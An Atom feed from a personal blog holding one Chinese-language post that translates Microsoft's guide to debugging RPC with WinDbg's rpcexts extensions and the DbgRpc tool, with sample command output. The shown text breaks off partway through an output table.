<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anhkgg&#39;s website | 内核研究 | 逆向分析 | 漏洞分析挖掘 | Windows Kernel | Rootkit | Reverse Engineer | Expolit</title>
  <subtitle>Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anhkgg.github.io/"/>
  <updated>2016-07-06T23:46:33.472Z</updated>
  <id>http://anhkgg.github.io/</id>
  
  <author>
    <name>Anhkgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windbg系列-RPC调试</title>
    <link href="http://anhkgg.github.io/Windbg%E7%B3%BB%E5%88%97-RPC%E8%B0%83%E8%AF%95/"/>
    <id>http://anhkgg.github.io/Windbg系列-RPC调试/</id>
    <published>2016-01-04T12:16:10.000Z</published>
    <updated>2016-07-06T23:46:33.472Z</updated>
    
    <content type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近在调试rpc，没法子，翻译了一下windbg这篇调试RPC的文档，后面可能还有其他内容，也就弄个系列吧&lt;br&gt;算是自己的笔记，有看客的话，可以多多指出问题，提提建议，不吝赐教！&lt;/p&gt;
&lt;p&gt;微软的远程过程调用（RPC）可以轻松越过进程和机器的界限并且进行数据通信。这种网络通信标准是微软Window网络通信如此强大的原因（….太绕了，翻不来，也不重要）。&lt;br&gt;然而，因为RPC对进程隐藏了网络调用，所以隐藏了计算机之间的交互细节。这使得用户很难确认线程为什么这么做，正在做什么，为什么在支持的功能上失败。所以，调试和解决RPC错误非常困难。另外，大部分RPC错误的问题实际上出现在配置问题，网络连接问题，其他组件问题上。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;Windows有个调试工具是DbgRpc，是RPC相关的调试器扩展。这些扩展能够用来分析Windows Xp以及更新版本系统的各种RPC问题。&lt;br&gt;这些Windows版本可以配置来保存RPC实时状态信息。可以保存不同数量的状态信息；这可以让你获得需要的信息，而不用防止一个重的负担在你的电脑上了（significant burden，什么东西）。细节请看Enabling RPC State Information&lt;/p&gt;
&lt;p&gt;之后这些信息就可以被调试器或者DbgRpc访问了。在每种情况下，一个集合的查询都是可以用的。细节请看Displaying RPC State Information&lt;/p&gt;
&lt;p&gt;在大部分情况下，你可以通过使用Common RPC Debugging Techniques.中的技术找到问题。&lt;br&gt;如果你想探索一下机器是怎么保存这些细腻的，或者你想设计自己的状态信息分析的技术，可以看看RPC State Information Internals.&lt;br&gt;这些工具和技术在Windows2000中不能使用&lt;/p&gt;
&lt;h1 id=&quot;激活RPC状态信息&quot;&gt;&lt;a href=&quot;#激活RPC状态信息&quot; class=&quot;headerlink&quot; title=&quot;激活RPC状态信息&quot;&gt;&lt;/a&gt;激活RPC状态信息&lt;/h1&gt;&lt;p&gt;可以收集两种不同的RPC运行时状态信息：服务端信息和完整信息。必须要在调试器或者DbgRpc使用之前激活状态信息的收集。&lt;br&gt;只有Windows XP以及以后的系统可以收集RPC状态信息。&lt;br&gt;收集服务端状态信息是比较轻量级。每次RPC调用大概需要100条机器指令，甚至在性能测试中都几乎不可察觉已经被加载了（…）。但是收集这些信息会耗费内存（每个RPC服务端大概4KB），所以不推荐内存有压力的机器使用。服务端信息包括数据，endpoints，线程，连接对象和服务调用对象（SCALL）。这些足够调试大部分RPC问题了。&lt;br&gt;收集全部状态信息更加heavyweight。它收集了所有的信息，包括服务端信息，另外还有客户端调用对象（CCALL）。全部状态信息通常是不需要的。&lt;br&gt;在电脑中运行Group Policy Editor(Gpedit.msc)可以激活收集RPC状态信息的功能。在本地电脑策略中，找到Computer Configuration/Administrative Templates/System/Remote Procedure Call。在这节下面可以看到RPC Troubleshooting State Information，当你编辑它的属性时，&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;本地计算机策略-计算机配置-管理模板-系统-远程过程调用-维护RPC疑难解答状态信息（默认未启用，启用之后配置下面5中状态）&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到5中可能的状态：&lt;br&gt;None：不维持任何状态信息。除非你电脑内存压力很大，不推荐这种配置。&lt;br&gt;Server：收集服务端状态信息。推荐在个人电脑中设置这个。&lt;br&gt;Full：收集全部状态信息。&lt;br&gt;Auto1：在内存小于64MB的电脑中，相当于None配置。在大于64MB的电脑中相当于Server配置。&lt;br&gt;Auto2：在内存小于128MB的运行Windows Server2003的电脑，或者运行Windows XP的电脑，相当于None配置。在大于128MB的Windows Server 2003中，相当于Server。这个也是默认配置。&lt;/p&gt;
&lt;p&gt;如果你想同时配置一个局域网中的电脑的这些状态，使用Group Policy Editor卷起（roll out）机器策略到首选的机器中。策略引擎会监视你配置的策略传到首选的机器中。在这种情况下，Auto1和Auto2是特别有用的，因为不同机器的操作系统和内存大小是不一样的。&lt;br&gt;如果网络中包括运行了比Windows XP更老的系统，这些电脑会忽略这些配置。&lt;/p&gt;
&lt;h1 id=&quot;显示RPC状态信息&quot;&gt;&lt;a href=&quot;#显示RPC状态信息&quot; class=&quot;headerlink&quot; title=&quot;显示RPC状态信息&quot;&gt;&lt;/a&gt;显示RPC状态信息&lt;/h1&gt;&lt;p&gt;各种各样的RPC调试扩展在Rpcexts.dll中导出。&lt;br&gt;这些用来显示RPC状态信息RPC扩展只能在用户模式中运行。他们可以在CDB(或者NTSD)或者用户模式的Windbg中使用。&lt;br&gt;用户模式的调试器必须有一个目标程序，但是这个目标跟RPC扩展又是没有关系的（？？）。如果调试器还没有运行，你可以简单打开它调试一个毫不相干的目标（比如windbg notepad或者cdb winmine）。接着在CDB中CTRL+C，或者Windbg中Debug|Break来停止目标进程，这样可以使用调试器的命令窗口。&lt;br&gt;如果你需要分析一个远程电脑的RPC状态信息，你需要在目标电脑中运行一个用户模式的调试器，然后使用Remote Debugging。&lt;br&gt;通过调试器访问RPC状态信息在一个stress环境中是特别有用的，或者当一个调试器已经运行了。&lt;/p&gt;
&lt;h2 id=&quot;使用RPC调试扩展&quot;&gt;&lt;a href=&quot;#使用RPC调试扩展&quot; class=&quot;headerlink&quot; title=&quot;使用RPC调试扩展&quot;&gt;&lt;/a&gt;使用RPC调试扩展&lt;/h2&gt;&lt;p&gt;各种各样的RPC调试扩展在Rpcexts.dll中导出。&lt;br&gt;这些用来显示RPC状态信息RPC扩展只能在用户模式中运行。他们可以在CDB(或者NTSD)或者用户模式的Windbg中使用。&lt;br&gt;用户模式的调试器必须有一个目标程序，但是这个目标跟RPC扩展又是没有关系的（？？）。如果调试器还没有运行，你可以简单打开它调试一个毫不相干的目标（比如windbg notepad或者cdb winmine）。接着在CDB中CTRL+C，或者Windbg中Debug|Break来停止目标进程，这样可以使用调试器的命令窗口。&lt;br&gt;如果你需要分析一个远程电脑的RPC状态信息，你需要在目标电脑中运行一个用户模式的调试器，然后使用Remote Debugging。&lt;br&gt;通过调试器访问RPC状态信息在一个stress环境中是特别有用的，或者当一个调试器已经运行了。&lt;/p&gt;
&lt;h2 id=&quot;使用DbgRpc工具&quot;&gt;&lt;a href=&quot;#使用DbgRpc工具&quot; class=&quot;headerlink&quot; title=&quot;使用DbgRpc工具&quot;&gt;&lt;/a&gt;使用DbgRpc工具&lt;/h2&gt;&lt;p&gt;DbgRpc工具（DbgRpc.exe）放在windbg安装目录中，必须使用命令提示窗口打开它。&lt;br&gt;双击是不能启动这个工具的。&lt;br&gt;命令提示窗口必须运行在本地电脑的administrator权限的账户下，或者域管理员权限。&lt;br&gt;DbgRpc不会对系统服务产生任何调用（比如LSASS）。 这个对调试时非常有用的，只要内核还在运行，即便在系统服务已经崩溃了。&lt;/p&gt;
&lt;p&gt;在远程电脑中使用DbgRpc&lt;br&gt;DbgRpc也可以用来检查远程电脑的信息。为了让这个可以正常工作，远程电脑需要可以接受远程连接和远程认证用户。如果远程电脑的RPCSS服务已经崩溃，DbgRpc将不能工作。远程电脑中也需要Administrative或者域管理员权限。&lt;/p&gt;
&lt;p&gt;-s参数用来指定服务端名字，-p指定传输协议。TCP和命名管道都可以使用。推荐使用TCP协议，它几乎可以在每种情况下使用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;G:\&amp;gt;dbgrpc -s MyServer -p ncacn_ip_tcp -l -P 1e8 -L 0.1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting remote cell info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Endpoint&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Status: Active&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Protocol Sequence: LRPC&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Endpoint name: OLE18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;DbgRpc命令行&lt;br&gt;可以查看详细的DbgRpc命令描述&lt;/p&gt;
&lt;h2 id=&quot;获取RPC-Cell信息&quot;&gt;&lt;a href=&quot;#获取RPC-Cell信息&quot; class=&quot;headerlink&quot; title=&quot;获取RPC Cell信息&quot;&gt;&lt;/a&gt;获取RPC Cell信息&lt;/h2&gt;&lt;p&gt;详细的cell信息通过!rpcexts.getdbgcell显示，或者使用DbgRpc的-l开关。&lt;br&gt;需要指定进程id已经cell number。&lt;br&gt;下面的例子，进程id是0x278，cell number是0000.0002&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -l -P 278 -L 0.2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Getting cell info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Thread&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Status: Dispatched&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Thread ID: 0x1A4 (420)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last update time (in seconds since boot):470.25 (0x1D6.19)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;For details on the optional parameters, see DbgRpc Command-Line Options.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;For a similar example using the RPC debugger extensions, see !rpcexts.getdbgcell.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;获取RPC-Endpoint信息&quot;&gt;&lt;a href=&quot;#获取RPC-Endpoint信息&quot; class=&quot;headerlink&quot; title=&quot;获取RPC Endpoint信息&quot;&gt;&lt;/a&gt;获取RPC Endpoint信息&lt;/h2&gt;&lt;p&gt;Endpoint信息通过!rpcexts.getendpointinfo显示，或者DbgRpc的-e开关。&lt;br&gt;如果指定了endpoint number，就会显示它的信息。如果忽略endpoint number，系统中所有进程的endpoint都会显示。&lt;br&gt;下面是显示所有endpoints的例子，通常包含进程id和cell number作为额外的参数是很有用的方式。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -e&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for endpoint info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST PROTSEQ        ENDPOINT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-------------------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00a8 0000.0001 01            NMP \PIPE\InitShutdown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00a8 0000.0003 01            NMP \PIPE\SfcApi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00a8 0000.0004 01            NMP \PIPE\ProfMapApi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00a8 0000.0007 01            NMP \pipe\winlogonrpc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00a8 0000.0008 01           LRPC OLE5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0001 01           LRPC ntsvcs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0003 01            NMP \PIPE\ntsvcs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0008 01            NMP \PIPE\scerpc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00d0 0000.0001 01            NMP \PIPE\lsass&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00d0 0000.0004 01            NMP \pipe\WMIEP_d0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00d0 0000.000b 01            NMP \PIPE\POLICYAGENT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00d0 0000.000c 01           LRPC policyagent&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0001 01           LRPC epmapper&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0003 01            TCP 135&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0005 01            SPX 34280&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0006 01             NB 135&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.0007 01             NB 135&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0170 0000.000b 01            NMP \pipe\epmapper&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;01b8 0000.0001 01            NMP \pipe\spoolss&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;01b8 0000.0003 01           LRPC spoolss&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;01b8 0000.0007 01           LRPC OLE7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0001 01           LRPC OLE2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0003 01           LRPC senssvc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0007 01            NMP \pipe\tapsrv&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0008 01           LRPC tapsrvlpc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.000c 01            NMP \PIPE\ROUTER&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00ec 0000.0010 01            NMP \pipe\WMIEP_ec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0214 0000.0001 01            NMP \PIPE\winreg&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;022c 0000.0001 01           LRPC LRPC0000022c.00000001&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;022c 0000.0003 01            TCP 1058&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;022c 0000.0005 01            SPX 24576&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;022c 0000.0006 01            NMP \PIPE\atsvc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;02a8 0000.0001 01           LRPC OLE3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0370 0000.0001 01           LRPC OLE9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0001 01            TCP 1120&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;030c 0000.0001 01           LRPC OLE12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;For details on the optional parameters, see DbgRpc Command-Line Options.&lt;br&gt;For a similar example using the RPC debugger extensions, see !rpcexts.getendpointinfo.&lt;/p&gt;
&lt;h2 id=&quot;获取RPC线程信息&quot;&gt;&lt;a href=&quot;#获取RPC线程信息&quot; class=&quot;headerlink&quot; title=&quot;获取RPC线程信息&quot;&gt;&lt;/a&gt;获取RPC线程信息&lt;/h2&gt;&lt;p&gt;使用显示!rpcexts.getthreadinfo线程信息，或者DbgRpc的-t开关。&lt;br&gt;必须指定进程pid。也可以指定线程ID，如果忽略，显示进程的所有线程。&lt;br&gt;例子，进程ID 0x278，忽略了线程ID&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -t -P 278&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for thread info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST TID      LASTTIME&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-----------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0002 01 000001a4 00072c09&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0278 0000.0005 03 0000031c 00072bf5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;For details on the optional parameters, see DbgRpc Command-Line Options.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;For a similar example using the RPC debugger extensions, see !rpcexts.getthreadinfo.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;获取RPC调用信息&quot;&gt;&lt;a href=&quot;#获取RPC调用信息&quot; class=&quot;headerlink&quot; title=&quot;获取RPC调用信息&quot;&gt;&lt;/a&gt;获取RPC调用信息&lt;/h2&gt;&lt;p&gt;服务端调用信息通过!rpcexts.getcallinfo显示，DbgRpc的-c开关&lt;br&gt;有4个可选的参数。其中三个CallID，IfStart，ProcNum是用来跟中RPC调用来标记信息的。第四个参数是ProcessID是服务端的Pid。你可以使用你知道的参数值来缩小搜索。&lt;br&gt;如果没有参数指定，系统中所有可知的SCALLs都会显示。例子：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;D:\wmsg&amp;gt;dbgrpc -c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Searching for call info ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID  CELL ID   ST PNO IFSTART  TIDNUMBER CALLFLAG CALLID   LASTTIME CONN/CLN&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;----------------------------------------------------------------------------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0002 00 00f 82273fdc 0000.0007 00000001 00000002 0003595d 0000.0010&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0006 00 009 367abb81 0000.0015 00000001 0000004d 000185bd 0000.0005&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.000a 00 007 367abb81 0000.002d 00000001 0000009f 00014672 0000.0009&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.000c 00 007 367abb81 0000.002d 00000001 00000083 000122e3 0000.000b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.000d 00 03b 8d9f4e40 0000.002d 00000001 000000f7 0001aba5 0000.0020&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.000e 00 03b 8d9f4e40 0000.0026 00000001 00000002 00023056 0000.0021&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.000f 00 008 82273fdc 0000.001e 00000009 baadf00d 000366b4 00ec.03bc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0012 00 00d 8d9f4e40 0000.0004 00000001 00000051 0000a334 0000.0011&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0014 00 000 367abb81 0000.0015 00000001 0000004c 0002db53 0000.0013&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0017 00 007 367abb81 0000.0015 00000001 00000006 0000d102 0000.0016&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0019 00 007 367abb81 0000.0004 00000001 00000006 0000f09e 0000.0018&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.001b 00 009 65a93890 0000.0007 00000001 0000012e 00630f65 0000.001a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.001e 00 026 8d9f4e40 0000.0015 00000001 0000037d 0005e579 0000.002c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.001f 00 008 82273fdc 0000.0033 00000009 baadf00d 000145b3 00c4.02f8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0023 00 000 367abb81 0000.0004 00000001 0000007e 000372f3 0000.0022&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0025 00 03b 8d9f4e40 0000.0026 00000001 0000000b 000122e3 0000.0024&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0027 00 000 367abb81 0000.002d 00000001 0000000b 00012e27 0000.0028&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.002a 00 008 82273fdc 0000.0033 00000009 baadf00d 0001245f 022c.0290&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.002f 00 007 367abb81 0000.0026 00000001 0000000a 0002983c 0000.002e&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0031 00 004 3ba0ffc0 0000.0026 00000001 00000007 0005c439 0000.001c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0032 00 00b 82273fdc 0000.0039 00000009 baadf00d 00687db6 00d0.01d4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0036 00 007 367abb81 0000.0030 00000001 00000065 0003a5e1 0000.0035&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00c4 0000.0037 00 00d 8d9f4e40 0000.0015 00000001 0000033f 000376fa 0000.002b&lt;/div&gt;&lt;div 